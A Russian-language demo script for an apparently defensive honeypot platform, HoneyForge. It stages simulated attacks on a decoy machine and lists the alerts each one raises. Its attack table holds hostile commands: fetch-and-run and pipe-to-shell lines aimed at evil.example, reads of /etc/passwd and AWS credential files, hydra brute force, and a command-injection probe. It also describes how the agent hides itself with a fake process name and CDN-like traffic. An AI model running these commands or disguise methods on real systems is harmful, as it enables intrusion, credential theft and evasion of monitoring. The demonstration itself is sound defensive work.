# Сценарий демонстрации: «атака → событие в центре»

Время: 5–7 минут. Нужны: открытая панель (LAN `http://192.168.1.122:4000`), второй экран/терминал «атакующего» в LAN
и хотя бы одна ловушка «на связи» (вкладка «Контейнеры»).

## 0. Подготовка (до выступления)

- Войти администратором, открыть «Обзор» (лента в реальном времени) и «Контейнеры» на втором мониторе.
- Узнать адрес ловушки: вкладка «Контейнеры» → адрес в DMZ (например `10.20.0.11`). Атакующий в LAN попадает на неё через проброс/маршрут
  до `vmbr1`; если маршрута нет — атаковать с самого Proxmox-хоста (`ssh pve`).
- В ловушке должны быть сервисы SSH (22), HTTP (80), Redis (6379) — добавляются в «Новый контейнер» / «Добавить ловушку».

## Docker-вариант (если нет Proxmox)

`docker build -t honeyforge-agent:latest agent/`, затем в панели «Подключить агента» → Docker выдаёт готовую команду `docker run` с токеном ловушки.

## 1. Показать парк и конструктор (1 мин)

1. «Ловушки» — каталог: Low (баннеры, интерактивные FTP и Redis), Medium (поддельный SSH с консолью Ubuntu, веб-админка).
2. «Профили» — профиль = шаблон: порты, баннеры, учётки-приманки, honeytoken, маскировка (интервал, джиттер).
3. «Новый контейнер» → выбрать типы → «Создать в Proxmox»: клон шаблона, запуск, агент включается сам (~30 с).

## 2. Атака (3 мин) — смотреть на ленту «Обзор»

| Шаг | Что делает «атакующий» | Что видно в панели |
|---|---|---|
| 1 | `nmap -sV -p22,80,6379 <ip ловушки>` | `connect` на каждый порт, источник и страна/ASN |
| 2 | `ssh root@<ip>` и любой пароль (`123456`) | `auth_attempt` с логином и паролем, `connect` |
| 3 | В консоли: `id; uname -a; cat /etc/passwd \| head -3` | `command` по каждой строке; консоль отвечает как Ubuntu |
| 4 | `cat /root/.aws/credentials` | `honeytoken` (красная метка) + алерт в Telegram |
| 5 | `wget http://evil.example/x.sh -O x.sh && chmod +x x.sh && ./x.sh` | `payload` (download-attempt), затем `execution-attempt` |
| 6 | `echo 'curl http://evil.example/m|sh' > /tmp/m.sh` | `payload` kind=write, файл попадает во вкладку «Файлы» |
| 7 | `sftp root@<ip>` → `put backdoor.bin /tmp/b.bin` | вкладка «Файлы»: SHA-256, размер, кнопка «Скачать» |
| 8 | перебор: `hydra -l root -P pass.txt ssh://<ip>` | ≥5 попыток за минуту → событие `alert` + сообщение в Telegram |
| 9 | `curl http://<ip>/.env`, `curl "http://<ip>/?cmd=id"` | `honeytoken` для `/.env`, `payload` web-attack-probe |
| 10 | `redis-cli -h <ip> INFO` | события Redis, пароль из `AUTH` в `auth_attempt` |

## 3. Что показать после атаки (1–2 мин)

- «Обзор»: лента, «Топ источников», «Откуда атакуют» (страны/ASN), «Топ паролей», экспорт IoC (CSV и STIX).
- Клик по событию → карточка: сессия, оценка HoneyMind (категория и threat_score), геолокация, ссылка на файл.
- «Файлы»: загруженные образцы с хэшем. «Аудит» (admin): кто что менял в панели.
- Telegram: алерт о honeytoken и переборе.

## 4. Маскировка — что показать комиссии (1 мин)

- С ловушки (внутри её консоли) панель HoneyForge не видна: `curl http://<центр>:4000/` из DMZ отвечает обычным 404, доступен только `/assets/v1/*`.
- Канал агента: путь как у CDN (`/assets/v1/manifest.json`), неверный токен → 404, тело зашифровано AES-256-GCM с случайным паддингом, интервал с джиттером.
- Имя процесса `systemd-journal-helper`, состояние в `/var/tmp/.cache-netsvc`; в поддельной консоли агента нет.
- Отпечаток: `ssh-audit <ip>`, `nmap -sV <ip>` — баннеры OpenSSH и Apache соответствуют версии ОС машины. Проверено 11.10.2026: `nmap -sV` определяет `OpenSSH 8.2p1 Ubuntu 4ubuntu0.11` и `Apache httpd 2.4.41 (Ubuntu)`; `ssh-audit` показывает список алгоритмов OpenSSH 8.2 (host-key: rsa-sha2-512, rsa-sha2-256, ssh-rsa, ecdsa, ed25519). Различия остаются в деталях реализации asyncssh (например, размер модуля DH-GEX).

## Если что-то не сработало

- Нет событий: вкладка «Контейнеры» — агент «на связи»? Иначе кнопка «Переустановить агента».
- Нет страны у IP: частные адреса не определяются; для публичных нужен выход центра в интернет (`HF_GEOIP_URL`).
- Telegram молчит: «Настройки» → «Отправить тест в Telegram».
